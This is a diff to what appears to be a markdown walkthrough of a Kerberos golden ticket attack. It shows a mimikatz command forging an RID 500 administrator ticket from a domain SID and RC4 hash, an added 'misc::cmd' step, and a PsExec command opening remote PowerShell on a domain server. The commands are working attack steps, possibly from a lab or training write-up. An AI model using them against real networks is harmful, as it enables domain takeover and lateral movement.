@@ -48,8 +48,12 @@ generate the ticket for impersonating user with RID 500.
 kerberos::golden /domain:karim.net /sid:S-1-5-21-750046758-1551849808-2392872301 /rc4:564e72d3c6c1927de1d2f252665e7c54  /user:admin /id:500 /ptt
 ```
 <img src="/img/golden/m1.PNG" alt="Getting-gz" width="1000" height="200"> 
-get a new cmd prompt which will allow to connect with domain server using PsExec.exe
 
+
+get a new cmd prompt which will allow to connect with domain server using PsExec.exe
+```
+mimikatz # misc::cmd
+```
 ```
 PsExec64.exe \\10.0.0.1 powershell.exe
 ```
